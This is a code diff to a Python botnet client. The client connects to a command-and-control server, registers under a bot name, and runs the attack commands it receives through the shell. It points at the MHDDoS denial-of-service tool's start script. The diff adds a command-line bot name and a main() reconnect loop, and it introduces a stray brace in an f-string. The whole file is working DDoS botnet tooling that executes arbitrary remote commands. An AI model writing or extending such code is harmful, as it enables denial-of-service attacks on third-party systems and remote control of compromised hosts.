@@ -1,3 +1,4 @@
+import sys
 import asyncio
 import time
 import subprocess
@@ -6,9 +7,9 @@ import os
 CUR_DIR = os.path.dirname(os.path.realpath(__file__))
 MHDDoS = CUR_DIR + os.sep + 'MHDDoS' + os.sep + 'start.py'
 
-async def start_bot():
+async def start_bot(bot_name):
     reader, writer = await asyncio.open_connection('127.0.0.1', 8888)
-    reg_cmd = f'register bot-{time.time()}'
+    reg_cmd = f'register {bot_name}}'
     writer.write(reg_cmd.encode())
     await writer.drain()
     print('Connected to C&C Server')
@@ -25,7 +26,11 @@ async def start_bot():
         result = subprocess.run(attack_cmd, shell=True, capture_output=True, text=True)
         print(f'result: {result.stdout}')
 
-while True:
-    asyncio.run(start_bot())
-    print('bot is disconected, will restart again')
-    time.sleep(10)
+def main():
+    while True:
+        asyncio.run(start_bot(sys.argv[1]))
+        print('bot is disconected, will restart again')
+        time.sleep(10)
+
+if __name__ == "__main__":
+    main()
